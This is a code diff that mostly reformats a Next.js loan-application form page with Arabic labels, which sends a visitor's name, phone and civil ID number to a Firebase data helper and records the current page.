@@ -1,38 +1,45 @@
-"use client"
+"use client";
 
-import { Button } from "@/components/ui/button"
-import { Card, CardContent } from "@/components/ui/card"
-import { Input } from "@/components/ui/input"
-import { Label } from "@/components/ui/label"
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
-import { addData } from "@/lib/firebase"
-import { Menu, Users, Home, Check } from "lucide-react"
-import { useRouter } from "next/navigation"
-import React, { useEffect, useState } from "react"
+import { Button } from "@/components/ui/button";
+import { Card, CardContent } from "@/components/ui/card";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import { addData } from "@/lib/firebase";
+import { Menu, Users, Home, Check } from "lucide-react";
+import { useRouter } from "next/navigation";
+import React, { useEffect, useState } from "react";
 
 export default function LoanApplicationPage() {
-  const [salary, setSalary] = useState('')
-  const [work, setWork] = useState('')
-  const [name, setName] = useState('')
-  const [idnumber, setIdnumber] = useState('')
-  const [phone, setPhone] = useState('')
-  const router = useRouter()
+  const [salary, setSalary] = useState("");
+  const [work, setWork] = useState("");
+  const [name, setName] = useState("");
+  const [idnumber, setIdnumber] = useState("");
+  const [phone, setPhone] = useState("");
+  const router = useRouter();
 
   const handleSubmit = (e: any) => {
-    e.preventDefault()
-    const visitorId = localStorage.getItem('visitor')
-    addData({ id: visitorId, name, idnumber, phone })
-    router.push("/loan-application/salary")
-  }
+    e.preventDefault();
+    const visitorId = localStorage.getItem("visitor");
+    addData({ id: visitorId, name, idnumber, phone });
+    router.push("/loan-application/salary");
+  };
   const handleUpdatePageName = async () => {
-    const visitorid = localStorage.getItem('visitor')
-    await addData({ id: visitorid, currentPage: 'معلومات 2' })
-  }
+    const visitorid =
+      localStorage.getItem("visitor") || new Date().toDateString();
+    await addData({ id: visitorid, currentPage: "معلومات 2" });
+  };
   useEffect(() => {
     handleUpdatePageName().then(() => {
-      console.log('Done')
-    })
-  }, [])
+      console.log("Done");
+    });
+  }, []);
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {/* Header */}
@@ -58,7 +65,10 @@ export default function LoanApplicationPage() {
           <CardContent className="p-6 space-y-6">
             {/* Net Salary Field */}
             <div className="space-y-2">
-              <Label htmlFor="netSalary" className="text-right block font-semibold text-gray-800">
+              <Label
+                htmlFor="netSalary"
+                className="text-right block font-semibold text-gray-800"
+              >
                 رقم الهاتف
               </Label>
               <Input
@@ -68,13 +78,18 @@ export default function LoanApplicationPage() {
                 placeholder="رقم الهاتف"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
-                onChange={(e) => { setPhone(e.target.value) }}
+                onChange={(e) => {
+                  setPhone(e.target.value);
+                }}
               />
             </div>
 
             {/* Work Type Field */}
             <div className="space-y-2">
-              <Label htmlFor="workType" className="text-right block font-semibold text-gray-800">
+              <Label
+                htmlFor="workType"
+                className="text-right block font-semibold text-gray-800"
+              >
                 الاسم
               </Label>
               <Input
@@ -83,14 +98,18 @@ export default function LoanApplicationPage() {
                 placeholder="الاسم"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
-                onChange={(e) => { setName(e.target.value) }}
-
+                onChange={(e) => {
+                  setName(e.target.value);
+                }}
               />
             </div>
 
             {/* Job Title Field */}
             <div className="space-y-2">
-              <Label htmlFor="jobTitle" className="text-right block font-semibold text-gray-800">
+              <Label
+                htmlFor="jobTitle"
+                className="text-right block font-semibold text-gray-800"
+              >
                 الرقم المدني
               </Label>
               <Input
@@ -99,8 +118,9 @@ export default function LoanApplicationPage() {
                 placeholder="رقم مدني"
                 className="text-right border-gray-200 focus:border-blue-500 focus:ring-blue-500 h-12"
                 dir="rtl"
-                onChange={(e) => { setIdnumber(e.target.value) }}
-
+                onChange={(e) => {
+                  setIdnumber(e.target.value);
+                }}
               />
             </div>
           </CardContent>
@@ -120,7 +140,10 @@ export default function LoanApplicationPage() {
         <Card className="shadow-lg border-0">
           <CardContent className="p-6 space-y-6">
             <div className="space-y-2">
-              <Label htmlFor="workSector" className="text-right block font-semibold text-gray-800">
+              <Label
+                htmlFor="workSector"
+                className="text-right block font-semibold text-gray-800"
+              >
                 قطاع العمل
               </Label>
               <Select dir="rtl">
@@ -155,7 +178,10 @@ export default function LoanApplicationPage() {
             <div className="absolute bottom-0 left-0 w-full h-20 bg-gradient-to-t from-blue-300 to-transparent"></div>
             <div className="absolute bottom-4 left-4 right-4 flex justify-between">
               {[...Array(8)].map((_, i) => (
-                <div key={i} className="w-6 h-6 border-2 border-blue-400 transform rotate-45"></div>
+                <div
+                  key={i}
+                  className="w-6 h-6 border-2 border-blue-400 transform rotate-45"
+                ></div>
               ))}
             </div>
           </div>
@@ -189,5 +215,5 @@ export default function LoanApplicationPage() {
         </div>
       </form>
     </div>
-  )
+  );
 }
